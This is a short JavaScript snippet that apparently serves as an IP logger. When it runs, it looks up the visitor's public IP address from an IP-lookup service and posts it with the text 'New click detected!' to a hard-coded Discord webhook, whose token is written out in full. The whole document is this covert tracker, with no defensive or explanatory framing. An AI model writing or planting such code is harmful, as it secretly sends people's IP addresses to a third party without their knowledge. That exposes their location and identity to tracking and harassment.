fetch("https://api64.ipify.org?format=json")
  .then(response => response.json())
  .then(data => {
    const webhookURL = "https://discord.com/api/webhooks/1340299539038605313/3Yx4Y0aekquhs6u3YOV58PUHOABB7H-aDp2GpN5fahA99rbPXn35Hw79M4Eqf7wyxTeG" 

    const message = {
      content: `New click detected! IP: ${data.ip}`
    };

    fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });
  });